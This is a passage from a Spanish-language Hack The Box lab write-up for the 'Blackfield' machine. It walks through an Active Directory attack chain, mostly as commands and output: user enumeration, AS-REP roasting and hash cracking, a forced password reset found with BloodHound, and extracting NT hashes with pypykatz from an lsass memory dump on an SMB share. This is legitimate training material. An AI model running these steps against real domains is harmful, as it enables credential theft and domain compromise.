2024/04/19 19:21:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 audit2020@blackfield.local
2024/04/19 19:23:14 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 support@blackfield.local
2024/04/19 19:23:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 svc_backup@blackfield.local
2024/04/19 19:23:45 <span class="o">&gt;</span>  Done! Tested 315 usernames <span class="o">(</span>3 valid<span class="o">)</span> <span class="k">in </span>166.123 seconds
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos hacer un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code> con los usuarios validos que tenemos <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast">https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast</a>.</p>
  </li>
  <li>
    <p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">support</code> ya que no tiene activado el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers blackfield.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User audit2020 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:0eabfacfb6de7f81120e4c162e0e1df9$2035e324a36e8b827defd1956fca64c98a164419f038369d586c107605a9aca2cf7ae0690a7e573446eb7d609ee6b584986de2d19383bc16f45a4872baa6239ab9e9d36e9704533f714a89ef6f6f3d9c956c6474ffcc127e0979e7cb60d9b55a2e031cc45370a9e9bf16f3dffccab5d7e838a39dd7be656a598d9f153cf0d7bc5a979cdf621b5d6e02bd483edb4284ad986bd55a0295f22a6dcc199135aa5886c782f448b78a711dcb32899edf17dccaa02b5d289564c88b022d4a25ac779d44b1c3ce5e96cdc41c417955a757506294434272fb38e386f507e062a3bb49b288ed2167d970cc81969e31fc1d307cebcf659123e0
[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span>
1g 0:00:01:05 DONE <span class="o">(</span>2024-04-19 19:29<span class="o">)</span> 0.01524g/s 218487p/s 218487c/s 218487C/s <span class="c">#1WIF3Y..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña sea correcta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.126.69   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
</code></pre></div></div>

<ul>
  <li>El usuario no forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
SMB         10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
HTTP        10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.126.69:5985/wsman
WINRM       10.129.126.69   5985   DC01             <span class="o">[</span>-] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
</code></pre></div></div>

<h2 id="support-enumeration">Support Enumeration</h2>

<ul>
  <li>Vamos a listar los recursos compartidos nivel de red para ese usuario ya que tenemos credenciales validas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver si en <code class="language-plaintext highlighter-rouge">profiles$</code> hay algo interesante.</p>
  </li>
  <li>
    <p>Pero nada solo había carpetas para cada usuario y dentro no había nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-r</span> <span class="s1">'profiles$/support/'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	./profiles<span class="nv">$support</span>/
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">ldapdomaindump</code> para enumerar por ese protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ldapdomaindump <span class="nt">-u</span> <span class="s1">'blackfield.local\support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> 10.129.126.69
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to host...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Binding to host
<span class="o">[</span>+] Bind OK
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting domain dump
<span class="o">[</span>+] Domain dump finished
</code></pre></div></div>

<ul>
  <li>Aquí tenemos los archivos que nos genera.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ll
total 1.4M
<span class="nt">-rw-r--r--</span> 1 root root 2.7K Apr 19 19:41 domain_computers.grep
<span class="nt">-rw-r--r--</span> 1 root root 6.1K Apr 19 19:41 domain_computers.html
<span class="nt">-rw-r--r--</span> 1 root root  39K Apr 19 19:41 domain_computers.json
<span class="nt">-rw-r--r--</span> 1 root root 6.4K Apr 19 19:41 domain_computers_by_os.html
<span class="nt">-rw-r--r--</span> 1 root root  10K Apr 19 19:41 domain_groups.grep
<span class="nt">-rw-r--r--</span> 1 root root  17K Apr 19 19:41 domain_groups.html
<span class="nt">-rw-r--r--</span> 1 root root  78K Apr 19 19:41 domain_groups.json
<span class="nt">-rw-r--r--</span> 1 root root  262 Apr 19 19:41 domain_policy.grep
<span class="nt">-rw-r--r--</span> 1 root root 1.2K Apr 19 19:41 domain_policy.html
<span class="nt">-rw-r--r--</span> 1 root root 6.0K Apr 19 19:41 domain_policy.json
<span class="nt">-rw-r--r--</span> 1 root root   71 Apr 19 19:41 domain_trusts.grep
<span class="nt">-rw-r--r--</span> 1 root root  828 Apr 19 19:41 domain_trusts.html
<span class="nt">-rw-r--r--</span> 1 root root    2 Apr 19 19:41 domain_trusts.json
<span class="nt">-rw-r--r--</span> 1 root root  62K Apr 19 19:41 domain_users.grep
<span class="nt">-rw-r--r--</span> 1 root root 143K Apr 19 19:41 domain_users.html
<span class="nt">-rw-r--r--</span> 1 root root 890K Apr 19 19:41 domain_users.json
<span class="nt">-rw-r--r--</span> 1 root root 106K Apr 19 19:41 domain_users_by_group.html
<span class="nt">-rw-r--r--</span> 1 root root  11K Feb  5 19:54 index.html
<span class="nt">-rw-r--r--</span> 1 root root  615 Feb  5 19:57 index.nginx-debian.html
</code></pre></div></div>

<ul>
  <li>Para poder verlos vamos habilitar el servidor de Apache2.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html service apache2 start
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver cualquier archivo que queramos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/1.png" />
</p>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">svc_backup</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/2.png" />
</p>

<h2 id="audit2020">audit2020</h2>

<ul>
  <li>Bueno necesitamos su contraseña pero por el momento no conocemos vías para convertirnos en ese usuario así que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound bloodhound-python <span class="nt">-c</span> all <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-ns</span> 10.129.23.192 <span class="nt">-d</span> blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dc01.blackfield.local:88<span class="o">)]</span> <span class="o">[</span>Errno <span class="nt">-2</span><span class="o">]</span> Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 <span class="nb">users
</span>INFO: Found 52 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done <span class="k">in </span>00M 24S
</code></pre></div></div>

<ul>
  <li>Podemos forzar a cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">AUDIT2020</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/3.png" />
</p>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">net</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/4.png" />
</p>

<ul>
  <li>Y con esto ya se supone que le cambiamos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound net rpc password audit2020 <span class="nt">-U</span> <span class="s1">'support'</span> <span class="nt">-S</span> 10.129.23.192
Enter new password <span class="k">for </span>audit2020:
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>upport]:
</code></pre></div></div>

<ul>
  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\a</span>udit2020:miguel123<span class="nv">$!</span>z
</code></pre></div></div>

<ul>
  <li>Vamos a validar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos acceso a un directorio interesante <code class="language-plaintext highlighter-rouge">Forensic / Audit share</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensic
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	<span class="nb">.</span>
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	..
	dr--r--r--                0 Sun Feb 23 12:14:37 2020	commands_output
	dr--r--r--                0 Thu May 28 15:29:24 2020	memory_analysis
	dr--r--r--                0 Fri Feb 28 16:30:34 2020	tools
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Y bueno dentro de una carpeta encontramos un <code class="language-plaintext highlighter-rouge">.zip</code> que ya es interesante <code class="language-plaintext highlighter-rouge">lsass.zip</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic/memory_analysis <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensicmemory_analysis
	dr--r--r--                0 Thu May 28 15:29:24 2020	<span class="nb">.</span>
	dr--r--r--                0 Thu May 28 15:29:24 2020	..
	fr--r--r--         37876530 Thu May 28 15:29:24 2020	conhost.zip
	fr--r--r--         24962333 Thu May 28 15:29:24 2020	ctfmon.zip
	fr--r--r--         23993305 Thu May 28 15:29:24 2020	dfsrs.zip
	fr--r--r--         18366396 Thu May 28 15:29:24 2020	dllhost.zip
	fr--r--r--          8810157 Thu May 28 15:29:24 2020	ismserv.zip
	fr--r--r--         41936098 Thu May 28 15:29:24 2020	lsass.zip
	fr--r--r--         64288607 Thu May 28 15:29:24 2020	mmc.zip
	fr--r--r--         13332174 Thu May 28 15:29:24 2020	RuntimeBroker.zip
	fr--r--r--        131983313 Thu May 28 15:29:24 2020	ServerManager.zip
	fr--r--r--         33141744 Thu May 28 15:29:24 2020	sihost.zip
	fr--r--r--         33756344 Thu May 28 15:29:24 2020	smartscreen.zip
	fr--r--r--         14408833 Thu May 28 15:29:24 2020	svchost.zip
	fr--r--r--         34631412 Thu May 28 15:29:24 2020	taskhostw.zip
	fr--r--r--         14255089 Thu May 28 15:29:24 2020	winlogon.zip
	fr--r--r--          4067425 Thu May 28 15:29:24 2020	wlms.zip
	fr--r--r--         18303252 Thu May 28 15:29:24 2020	WmiPrvSE.zip
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h2 id="shell-as-svc_backup">Shell as svc_backup</h2>

<ul>
  <li>
    <p><a href="https://www.reviversoft.com/es/processes/lsass.exe?ncr=1">https://www.reviversoft.com/es/processes/lsass.exe?ncr=1</a>.</p>
  </li>
  <li>
    <p>Vamos a descárgalo a nuestra maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--download</span> forensic/memory_analysis/lsass.zip <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: forensic<span class="se">\m</span>emory_analysis<span class="se">\l</span>sass.zip <span class="o">(</span>41936098 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Blackfield/content/bloodhound/10.129.23.192-forensic_memory_analysis_lsass.zip
</code></pre></div></div>

<ul>
  <li>Dentro tenemos el archivo importante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l lsass.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 41936098 bytes <span class="o">(</span>40 MiB<span class="o">)</span>

Listing archive: lsass.zip

<span class="nt">--</span>
Path <span class="o">=</span> lsass.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 41936098

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-02-23 11:02:02 ....A    143044222     41935982  lsass.DMP
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-02-23 11:02:02          143044222     41935982  1 files
</code></pre></div></div>

<ul>
  <li>Vamos a extraerlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora podemos usar la siguiente herramienta <a href="https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/">https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/</a>.</p>
  </li>
  <li>
    <p>Vamos a obtener información privilegiada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: <span class="o">========</span> lsass.DMP <span class="o">=======</span>
<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406458 <span class="o">(</span>633ba<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 365835 <span class="o">(</span>5950b<span class="o">)</span>
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5950b]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>593b5]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 257142 <span class="o">(</span>3ec76<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 153705 <span class="o">(</span>25869<span class="o">)</span>
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a89550
	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
		username Administrator
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
		username Administrator
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> DPAPI <span class="o">[</span>25869]<span class="o">==</span>
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
